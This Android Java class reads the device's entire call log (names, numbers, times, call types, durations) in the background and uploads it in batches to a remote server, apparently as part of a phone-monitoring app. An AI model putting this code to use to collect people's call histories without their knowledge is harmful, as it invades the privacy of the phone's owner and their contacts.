package com.inet.android.archive;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.provider.CallLog;

import com.inet.android.db.RequestDataBaseHelper;
import com.inet.android.request.OnDemandRequest;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

public class ArchiveCall extends AsyncTask<Context, Void, Void> {
	Context mContext;
	RequestDataBaseHelper db;
	private String iType = "1";;
	ConvertDate date;
	private String LOG_TAG = "ArchiveCall";
	// private int type;
	private String complete;
	Editor ed;
	SharedPreferences sp;

	private String readCallLogs() {
		String sendStr = null;
		String type = "0";
		date = new ConvertDate();
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		ed = sp.edit();

		Logging.doLog(LOG_TAG,
				"network" + sp.getBoolean("network_available", true), "network"
						+ sp.getBoolean("network_available", true));
		if (sp.getBoolean("network_available", true) == true) {

			Cursor callLogCursor = null;
			// Делаем запрос к контент-провайдеру
			// и получаем все данные из таблицы

			complete = "0";
			callLogCursor = mContext.getContentResolver().query(
					android.provider.CallLog.Calls.CONTENT_URI, null, null,
					null, android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);

			if (callLogCursor != null) {
				JSONObject archiveCallJson = new JSONObject();

				// Проходим в цикле, пока не дойдём до последней записи
				
				while (callLogCursor.moveToNext()) {
					
					// Имя контакта
					String name = callLogCursor.getString(callLogCursor
							.getColumnIndex(CallLog.Calls.CACHED_NAME));
					
					String cacheNumber = callLogCursor.getString(callLogCursor
							.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL));
					// Номер контакта и т.д.
					String number = callLogCursor.getString(callLogCursor
							.getColumnIndex(CallLog.Calls.NUMBER));
					// String name = getNumber.getContactName(callLogCursor
					// .getString(callLogCursor
					// .getColumnIndex("address")))
					long dateTimeMillis = callLogCursor.getLong(callLogCursor
							.getColumnIndex(CallLog.Calls.DATE));
//					long durationMillis = callLogCursor.getLong(callLogCursor
//							.getColumnIndex(CallLog.Calls.DURATION));
					int callType = callLogCursor.getInt(callLogCursor
							.getColumnIndex(CallLog.Calls.TYPE));
					int durationInt = callLogCursor.getColumnIndex(CallLog.Calls.DURATION);
					String duration = callLogCursor.getString(durationInt);
					
					String dateString = date.getData(dateTimeMillis);

					if (cacheNumber == null)
						cacheNumber = number;
					if (name == null)
						name = "No Name";
					if (callType == CallLog.Calls.OUTGOING_TYPE) {
						type = "3";
					} else if (callType == CallLog.Calls.INCOMING_TYPE) {
						type = "2";
					} else if (callType == CallLog.Calls.MISSED_TYPE) {
						type = "4";
					}
					try {
						archiveCallJson.put("time", dateString);
						archiveCallJson.put("number", number);
						archiveCallJson.put("type", type);
						archiveCallJson.put("name", name);
						if (!iType.equals(3))
							archiveCallJson.put("duration", duration);
						if (sendStr == null)
							sendStr = archiveCallJson.toString();
						else
							sendStr += "," + archiveCallJson.toString();

					} catch (JSONException e) {
						// TODO Автоматически созданный блок catch
						e.printStackTrace();
					}
					if (sendStr.length() >= 50000) {
						Logging.doLog(LOG_TAG, "str >= 50000 ..",
								"str >= 50000 ..");
						sendRequest(sendStr, complete);
						ed.putString("statusCallList", "1");
						sendStr = null;
					}
				}
				complete = "1";
				Logging.doLog(LOG_TAG, "Send complete 1 ..",
						"Send complete 1 ..");
				sendRequest(sendStr, complete);
				sendStr = null;
				ed.putString("statusCallList", "0");

				callLogCursor.close();
			}
		} else {
			ed.putString("statusCallList", "1");
		}
		ed.commit();

		return null;
	}

	private void sendRequest(String str, String complete) {
		if (str != null) {
			OnDemandRequest dr = new OnDemandRequest(mContext, iType, complete);
			dr.sendRequest(str);
			// Logging.doLog(LOG_TAG, str, str);
		}
	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Автоматически созданная заглушка метода
		Logging.doLog(LOG_TAG, "doIn");
		this.mContext = params[0];
		readCallLogs();
		return null;
	}

	@Override
	protected void onPostExecute(Void result) {
		// TODO Auto-generated method stub
		super.onPostExecute(result);
	}

}
